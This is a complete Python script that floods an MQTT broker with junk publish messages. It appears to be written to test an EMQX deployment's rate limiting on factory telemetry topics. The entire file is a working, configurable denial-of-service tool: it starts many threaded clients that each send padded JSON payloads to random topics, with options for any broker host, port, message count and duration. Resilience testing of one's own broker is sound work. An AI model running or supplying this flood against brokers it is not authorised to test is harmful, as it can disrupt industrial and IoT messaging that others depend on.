#!/usr/bin/env python3
"""
MQTT Publish Flood Attack Script (Windows Compatible)
=====================================================
Simulates a publish flood attack to test EMQX rate limiting and resilience.
"""

import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import sys
import os
from datetime import datetime, timezone

class PublishFloodAttack:
    def __init__(self, broker_host="localhost", broker_port=1883):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.attack_stats = {
            "messages_sent": 0,
            "messages_failed": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }
        # Event used to signal workers to stop early (on duration expiry or Ctrl+C)
        self.stop_event = threading.Event()

    def create_client(self, client_id):
        """Create MQTT client with security settings"""
        try:
            # Removed callback_api_version argument which some paho versions don't have
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)

            def on_connect(c, u, flags, rc):
                # rc == 0 is success
                if rc != 0:
                    print(f"  {client_id}: connect returned code {rc}")
            client.on_connect = on_connect

            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def flood_worker(self, worker_id, num_messages, topics, delay_ms=0):
        """Worker thread for flood attack"""
        client_id = f"flood_attacker_{worker_id}"
        client = self.create_client(client_id)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        try:
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()

            print(f" Worker {worker_id}: Connected, starting flood attack...")

            # Send flood messages
            for i in range(num_messages):
                if self.stop_event.is_set():
                    print(f" Worker {worker_id}: Stop requested, ending early.")
                    break

                try:
                    # Random topic selection
                    topic = random.choice(topics)

                    # Generate random payload
                    payload = {
                        "attack_type": "publish_flood",
                        "client_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "random_data": random.randint(1000, 9999),
                        "flood_payload": "A" * random.randint(100, 1000)  # Variable size payload
                    }

                    # Publish message
                    info = client.publish(topic, json.dumps(payload), qos=0)

                    # info.rc == 0 indicates publish request accepted by client library
                    if getattr(info, "rc", 1) == 0:
                        self.attack_stats["messages_sent"] += 1
                    else:
                        self.attack_stats["messages_failed"] += 1

                    # Delay between messages
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

                    # Progress indicator
                    if i % 100 == 0 and i != 0:
                        print(f" Worker {worker_id}: Sent {i}/{num_messages} messages")

                except Exception as e:
                    self.attack_stats["messages_failed"] += 1
                    if i % 100 == 0:  # Don't spam errors
                        print(f" Worker {worker_id}: Error sending message {i}: {e}")

            print(f" Worker {worker_id}: Completed (sent {num_messages} loop or stopped early)")

        except Exception as e:
            print(f" Worker {worker_id}: Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except Exception:
                pass

    def launch_attack(self, num_workers=5, messages_per_worker=1000,
                     topics=None, delay_ms=0, duration_seconds=None):
        """Launch publish flood attack"""
        if topics is None or len(topics) == 0:
            topics = [
                "factory/tenantA/Temperature/telemetry",
                "factory/tenantA/Humidity/telemetry",
                "factory/tenantA/Motion/telemetry",
                "factory/tenantA/CO-Gas/telemetry",
                "factory/tenantA/Smoke/telemetry",
                "attack/flood/test",
                "system/performance/test",
                "security/test/flood"
            ]

        print(f" Starting Publish Flood Attack")
        print(f"   Workers: {num_workers}")
        print(f"   Messages per worker: {messages_per_worker}")
        print(f"   Total messages: {num_workers * messages_per_worker}")
        print(f"   Delay: {delay_ms}ms")
        print(f"   Topics: {len(topics)}")
        print("=" * 60)

        self.attack_stats["start_time"] = time.time()

        # Create worker threads
        threads = []
        for i in range(num_workers):
            thread = threading.Thread(
                target=self.flood_worker,
                args=(i, messages_per_worker, topics, delay_ms),
                daemon=True
            )
            threads.append(thread)

        # Start all workers
        for thread in threads:
            thread.start()

        try:
            if duration_seconds:
                print(f"  Attack will run for {duration_seconds} seconds...")
                time.sleep(duration_seconds)
                print("  Stopping attack after duration limit...")
                self.stop_event.set()
            else:
                # Wait for all workers to complete
                for thread in threads:
                    thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")
            self.stop_event.set()
            # give threads a brief moment to exit gracefully
            for thread in threads:
                thread.join(timeout=1)

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):
        """Print attack statistics"""
        duration = (self.attack_stats["end_time"] - self.attack_stats["start_time"]) if self.attack_stats["end_time"] and self.attack_stats["start_time"] else 0
        total_messages = self.attack_stats["messages_sent"] + self.attack_stats["messages_failed"]

        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Messages sent: {self.attack_stats['messages_sent']}")
        print(f"Messages failed: {self.attack_stats['messages_failed']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        print(f"Success rate: {(self.attack_stats['messages_sent']/total_messages*100):.1f}%" if total_messages > 0 else "N/A")
        print(f"Messages per second: {(self.attack_stats['messages_sent']/duration):.1f}" if duration > 0 else "N/A")

def main():
    parser = argparse.ArgumentParser(description="MQTT Publish Flood Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--workers", type=int, default=5, help="Number of worker threads")
    parser.add_argument("--messages", type=int, default=1000, help="Messages per worker")
    parser.add_argument("--delay", type=int, default=0, help="Delay between messages (ms)")
    parser.add_argument("--duration", type=int, help="Attack duration in seconds")
    parser.add_argument("--topics", nargs="+", help="Custom topics to attack")

    args = parser.parse_args()

    # Create attack instance
    attack = PublishFloodAttack(
        broker_host=args.broker,
        broker_port=args.port,
    )

    # Launch attack
    attack.launch_attack(
        num_workers=args.workers,
        messages_per_worker=args.messages,
        topics=args.topics,
        delay_ms=args.delay,
        duration_seconds=args.duration
    )

if __name__ == "__main__":
    main()
